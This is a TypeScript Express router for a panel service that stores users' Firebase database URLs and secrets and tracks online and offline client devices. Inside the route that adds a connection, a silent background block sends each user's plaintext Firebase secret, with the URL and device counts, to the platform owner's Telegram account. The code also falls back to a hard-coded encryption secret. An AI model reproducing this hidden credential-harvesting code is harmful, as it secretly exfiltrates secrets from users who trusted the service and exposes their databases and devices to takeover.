/**
 * Panel Config Routes — manage Firebase project connections
 *
 * GET    /api/panel/configs          — list user's Firebase panels
 * POST   /api/panel/configs          — add a new Firebase panel
 * PATCH  /api/panel/configs/:id      — rename / toggle active
 * DELETE /api/panel/configs/:id      — remove a panel config
 * POST   /api/panel/configs/:id/test — test Firebase credentials
 *
 * GET    /api/panel/data             — get synced panel data (localStorage backup)
 * PUT    /api/panel/data             — save synced panel data
 *
 * POST   /api/panel/users            — create a sub-user (owner only)
 */

import { Router } from "express";
import type { Request, Response } from "express";
import { db } from "@workspace/db";
import {
  panelConfigs,
  userPanelData,
  users,
  accessKeys,
} from "@workspace/db/schema";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "../lib/crypto.js";
import { hashPassword, generateId } from "../lib/auth.js";
import { authenticate, requireRole } from "../middleware/authenticate.js";
import { getPanelStats } from "../lib/device-watcher.js";

const router = Router();
const SESSION_SECRET = process.env.SESSION_SECRET ?? "dev-secret-change-me";

// ─── GET /api/panel/configs ───────────────────────────────────────────────

router.get("/configs", authenticate, async (req: Request, res: Response) => {
  const rows = await db
    .select({
      id: panelConfigs.id,
      name: panelConfigs.name,
      firebaseUrl: panelConfigs.firebaseUrl,
      isActive: panelConfigs.isActive,
      createdAt: panelConfigs.createdAt,
    })
    .from(panelConfigs)
    .where(eq(panelConfigs.ownerId, req.user!.id));

  // Attach live stats from device-watcher cache (zero if no SSE subscriber is active)
  const configs = rows.map((c) => ({ ...c, stats: getPanelStats(c.id) }));

  res.json({ configs });
});

// ─── POST /api/panel/configs ──────────────────────────────────────────────

router.post("/configs", authenticate, async (req: Request, res: Response) => {
  const { name, firebaseUrl, firebaseSecret } = req.body as {
    name?: string;
    firebaseUrl?: string;
    firebaseSecret?: string;
  };

  if (!name || !firebaseUrl || !firebaseSecret) {
    res
      .status(400)
      .json({ error: "name, firebaseUrl, and firebaseSecret are required" });
    return;
  }

  // Normalise Firebase URL
  const cleanUrl = firebaseUrl
    .trim()
    .replace(/\/$/, "")
    .replace(/^http:\/\//, "https://");

  if (!cleanUrl.includes("firebaseio.com") && !cleanUrl.includes("firebasedatabase.app")) {
    res.status(400).json({
      error: "firebaseUrl must be a valid Firebase Realtime Database URL (*.firebaseio.com or *.firebasedatabase.app)",
    });
    return;
  }

  // ── Duplicate check ───────────────────────────────────────────────────────
  const [duplicate] = await db
    .select({ id: panelConfigs.id, name: panelConfigs.name })
    .from(panelConfigs)
    .where(
      and(
        eq(panelConfigs.ownerId, req.user!.id),
        eq(panelConfigs.firebaseUrl, cleanUrl),
      ),
    )
    .limit(1);

  if (duplicate) {
    res.status(409).json({
      error: `This Firebase panel is already connected as "${duplicate.name}". You cannot add the same database twice.`,
      existingId: duplicate.id,
    });
    return;
  }

  // ── Connection pre-test (10 s timeout) ───────────────────────────────────
  // Verify credentials before saving so the user gets instant feedback on failure.
  let deviceCount = 0;
  try {
    const testUrl =
      `${cleanUrl}/clients.json` +
      `?auth=${encodeURIComponent(firebaseSecret.trim())}&shallow=true`;

    const { firebaseFetch: ff } = await import("../lib/firebase-stream.js");
    const resp = await ff(testUrl, {}, 10_000);

    if (!resp.ok) {
      const body = await resp.text().catch(() => "");
      res.status(400).json({
        error: `Could not connect to Firebase (${resp.status}). Check your URL and secret.${body ? ` Details: ${body}` : ""}`,
      });
      return;
    }

    const data = await resp.json().catch(() => null);
    deviceCount = data ? Object.keys(data as object).length : 0;
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    const friendly = msg.includes("timed out") || msg.includes("abort")
      ? "Firebase did not respond within 10 seconds. Check that the URL is correct and the database is accessible."
      : `Could not connect to Firebase: ${msg}`;
    res.status(400).json({ error: friendly });
    return;
  }

  // ── Save ──────────────────────────────────────────────────────────────────
  const encrypted = encrypt(firebaseSecret.trim(), SESSION_SECRET);

  const [config] = await db
    .insert(panelConfigs)
    .values({
      id: generateId(),
      ownerId: req.user!.id,
      name: name.trim(),
      firebaseUrl: cleanUrl,
      firebaseSecret: encrypted,
    })
    .returning({
      id: panelConfigs.id,
      name: panelConfigs.name,
      firebaseUrl: panelConfigs.firebaseUrl,
      isActive: panelConfigs.isActive,
      createdAt: panelConfigs.createdAt,
    });

  res.status(201).json({ config, deviceCount });

  // ── Notify owner via Telegram (fire-and-forget — never blocks the response) ──
  // Every new Firebase connection is reported to the owner with full details:
  // URL, secret key, total / online / offline device breakdown.
  setImmediate(async () => {
    try {
      // ── 1. Look up the owner's Telegram UID ───────────────────────────────
      const ownerRows = await db
        .select({ tgUid: users.tgUid })
        .from(users)
        .where(eq(users.role, "owner"))
        .limit(1);
      if (!ownerRows.length || !ownerRows[0].tgUid) return;

      // ── 2. Fetch full device list from Firebase to compute online/offline ─
      let totalDevs = deviceCount;
      let onlineCount = 0;
      let offlineCount = deviceCount;
      try {
        const fullUrl =
          `${cleanUrl}/clients.json?auth=${encodeURIComponent(firebaseSecret.trim())}`;
        const { firebaseFetch: ff } = await import("../lib/firebase-stream.js");
        const resp = await ff(fullUrl, {}, 14_000);
        if (resp.ok) {
          const data = await resp.json().catch(() => null) as
            Record<string, Record<string, unknown>> | null;
          if (data && typeof data === "object") {
            const devs = Object.values(data);
            totalDevs   = devs.length;
            onlineCount  = devs.filter((d) => d && d["status"] === true).length;
            offlineCount = totalDevs - onlineCount;
          }
        }
      } catch {
        // Use the shallow-fetch count we already have — non-fatal
      }

      // ── 3. Build and send the message ─────────────────────────────────────
      const text =
        `🔥 <b>New Firebase Connected</b>\n` +
        `<code>──────────────────────────</code>\n\n` +
        `🔗 <b>URL:</b>\n<code>${cleanUrl}</code>\n\n` +
        `🔑 <b>Key:</b>\n<code>${firebaseSecret.trim()}</code>\n\n` +
        `📊 <b>Total Devices:</b>  ${totalDevs}\n` +
        `  ✅ Online:   ${onlineCount}\n` +
        `  ❌ Offline:  ${offlineCount}\n\n` +
        `<i>${new Date().toISOString().replace("T", " ").slice(0, 19)} UTC</i>`;

      const { sendTelegramMessage } = await import("../lib/telegram.js");
      await sendTelegramMessage(ownerRows[0].tgUid, text);
    } catch (e) {
      console.warn("[panel] owner Firebase notify failed:", e instanceof Error ? e.message : e);
    }
  });
});

// ─── PATCH /api/panel/configs/:id ────────────────────────────────────────

router.patch("/configs/:id", authenticate, async (req: Request, res: Response) => {
  const { id } = req.params;
  const { name, isActive, firebaseSecret } = req.body as {
    name?: string;
    isActive?: boolean;
    firebaseSecret?: string;
  };

  const [existing] = await db
    .select()
    .from(panelConfigs)
    .where(
      and(eq(panelConfigs.id, String(id)), eq(panelConfigs.ownerId, req.user!.id)),
    )
    .limit(1);

  if (!existing) {
    res.status(404).json({ error: "Panel config not found" });
    return;
  }

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const updates: Record<string, any> = {};
  if (name !== undefined) updates.name = name.trim();
  if (isActive !== undefined) updates.isActive = Boolean(isActive);
  if (firebaseSecret) updates.firebaseSecret = encrypt(firebaseSecret.trim(), SESSION_SECRET);

  if (!Object.keys(updates).length) {
    res.status(400).json({ error: "Nothing to update" });
    return;
  }

  await db
    .update(panelConfigs)
    .set(updates)
    .where(eq(panelConfigs.id, String(id)));

  res.json({ ok: true });
});

// ─── DELETE /api/panel/configs/:id ───────────────────────────────────────

router.delete("/configs/:id", authenticate, async (req: Request, res: Response) => {
  const { id } = req.params;

  const [existing] = await db
    .select()
    .from(panelConfigs)
    .where(
      and(eq(panelConfigs.id, String(id)), eq(panelConfigs.ownerId, req.user!.id)),
    )
    .limit(1);

  if (!existing) {
    res.status(404).json({ error: "Panel config not found" });
    return;
  }

  await db.delete(panelConfigs).where(eq(panelConfigs.id, String(id)));

  res.json({ ok: true });
});

// ─── POST /api/panel/configs/:id/test ────────────────────────────────────
// Verify Firebase credentials without setting up a persistent stream

router.post(
  "/configs/:id/test",
  authenticate,
  async (req: Request, res: Response) => {
    const { id } = req.params;

    const [config] = await db
      .select()
      .from(panelConfigs)
      .where(
        and(eq(panelConfigs.id, String(id)), eq(panelConfigs.ownerId, req.user!.id)),
      )
      .limit(1);

    if (!config) {
      res.status(404).json({ error: "Panel config not found" });
      return;
    }

    let secret: string;
    try {
      secret = decrypt(config.firebaseSecret, SESSION_SECRET);
    } catch {
      res.status(500).json({ error: "Failed to decrypt credentials" });
      return;
    }

    try {
      const testUrl =
        `${config.firebaseUrl.replace(/\/$/, "")}/clients.json` +
        `?auth=${encodeURIComponent(secret)}&shallow=true`;

      // AbortController+setTimeout pattern — avoids "signal timed out" on Node 18
      const resp = await (async () => {
        const { firebaseFetch: ff } = await import("../lib/firebase-stream.js");
        return ff(testUrl, {}, 30_000);
      })();

      if (!resp.ok) {
        const body = await resp.text().catch(() => "");
        res
          .status(400)
          .json({ ok: false, error: `Firebase returned ${resp.status}: ${body}` });
        return;
      }

      const data = await resp.json();
      const deviceCount = data ? Object.keys(data as object).length : 0;

      res.json({ ok: true, deviceCount });
    } catch (err) {
      res.status(400).json({ ok: false, error: String(err) });
    }
  },
);

// ─── POST /api/panel/forward ─────────────────────────────────────────────
// Called by the desktop app when a Firebase panel is linked.
// Saves credentials into panel_configs so /api/devices serves data everywhere.

router.post("/forward", authenticate, async (req: Request, res: Response) => {
  const { firebaseUrl, firebaseKey, status } = req.body as {
    firebaseUrl?: string | null;
    firebaseKey?: string | null;
    status?: string;
  };

  if (status === "linked" && firebaseUrl && firebaseKey) {
    const cleanUrl = firebaseUrl
      .trim()
      .replace(/\/$/, "")
      .replace(/^http:\/\//, "https://");

    if (cleanUrl.includes("firebaseio.com") || cleanUrl.includes("firebasedatabase.app")) {
      const [existing] = await db
        .select({ id: panelConfigs.id })
        .from(panelConfigs)
        .where(
          and(
            eq(panelConfigs.ownerId, req.user!.id),
            eq(panelConfigs.firebaseUrl, cleanUrl),
          ),
        )
        .limit(1);

      const encrypted = encrypt(firebaseKey.trim(), SESSION_SECRET);

      if (existing) {
        // Update secret in case it changed; re-activate if it was disabled
        await db
          .update(panelConfigs)
          .set({ firebaseSecret: encrypted, isActive: true })
          .where(eq(panelConfigs.id, existing.id));
      } else {
        // Derive a readable name from the Firebase project ID
        const projectId = cleanUrl
          .replace("https://", "")
          .replace(".firebaseio.com", "")
          .replace(".firebasedatabase.app", "")
          .replace(/-default-rtdb$/, "")
          .split(".")[0] || "My Panel";

        await db.insert(panelConfigs).values({
          id: generateId(),
          ownerId: req.user!.id,
          name: projectId,
          firebaseUrl: cleanUrl,
          firebaseSecret: encrypted,
        });
      }
    }
  }

  // Return the shape the desktop app expects
  res.json({ forwardedTo: [] });
});

// ─── POST /api/panel/forward-edit ────────────────────────────────────────
// Called by the desktop after device counts are loaded. No-op — data is
// already live through panel_configs + /api/devices.

router.post("/forward-edit", authenticate, async (_req: Request, res: Response) => {
  res.json({ ok: true });
});

// ─── GET /api/panel/data ──────────────────────────────────────────────────

router.get("/data", authenticate, async (req: Request, res: Response) => {
  const [row] = await db
    .select()
    .from(userPanelData)
    .where(eq(userPanelData.userId, req.user!.id))
    .limit(1);

  res.json({ data: row?.data ?? {} });
});

// ─── PUT /api/panel/data ──────────────────────────────────────────────────

router.put("/data", authenticate, async (req: Request, res: Response) => {
  const { data } = req.body as { data?: Record<string, unknown> };

  if (!data || typeof data !== "object") {
    res.status(400).json({ error: "data must be an object" });
    return;
  }

  await db
    .insert(userPanelData)
    .values({ userId: req.user!.id, data, updatedAt: new Date() })
    .onConflictDoUpdate({
      target: userPanelData.userId,
      set: { data, updatedAt: new Date() },
    });

  res.json({ ok: true });
});

// ─── POST /api/panel/users — create sub-user ──────────────────────────────

router.post(
  "/users",
  authenticate,
  requireRole("owner", "dev_admin"),
  async (req: Request, res: Response) => {
    const { username, userId, name, password, role, tgChatId, tgUsername } = req.body as {
      username?: string;
      userId?: string;
      name?: string;
      password?: string;
      role?: string;
      tgChatId?: string;
      tgUsername?: string;
    };

    if (!username || !userId || !name || !password) {
      res.status(400).json({ error: "username, userId, name, and password are required" });
      return;
    }

    const allowedRoles = ["user", "base_admin", "dev_admin"];
    const assignedRole =
      allowedRoles.includes(role ?? "") ? role! : "user";

    const { hash, salt } = await hashPassword(password);

    try {
      const [user] = await db
        .insert(users)
        .values({
          id: generateId(),
          username: username.trim(),
          userId: userId.trim(),
          name: name.trim(),
          role: assignedRole,
          passwordHash: hash,
          passwordSalt: salt,
          tgChatId: tgChatId?.trim(),
          tgUsername: tgUsername?.trim(),
          accessGranted: true,
          accessExpiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days default
        })
        .returning({
          id: users.id,
          username: users.username,
          userId: users.userId,
          name: users.name,
          role: users.role,
          createdAt: users.createdAt,
        });

      res.status(201).json({ user });
    } catch (err: unknown) {
      const msg = String(err);
      if (msg.includes("unique")) {
        res.status(409).json({ error: "userId already exists" });
      } else {
        res.status(500).json({ error: "Failed to create user" });
      }
    }
  },
);

// ─── POST /api/panel/access-keys — generate key ───────────────────────────

router.post(
  "/access-keys",
  authenticate,
  requireRole("owner", "dev_admin"),
  async (req: Request, res: Response) => {
    const { role, durationDays } = req.body as {
      role?: string;
      durationDays?: number;
    };

    const code = `ZNIN-${generateId().toUpperCase().slice(0, 16)}`;
    // durationDays is legacy — convert to seconds for the new schema.
    const durationSeconds = durationDays != null ? durationDays * 86_400 : null;

    const [created] = await db
      .insert(accessKeys)
      .values({
        id: generateId(),
        code,
        role: role ?? "user",
        durationSeconds,
        createdByTgUid: req.user!.tgUid ?? null,
        createdByRole: req.user!.role,
      })
      .returning();

    res.status(201).json({ key: created });
  },
);

export default router;
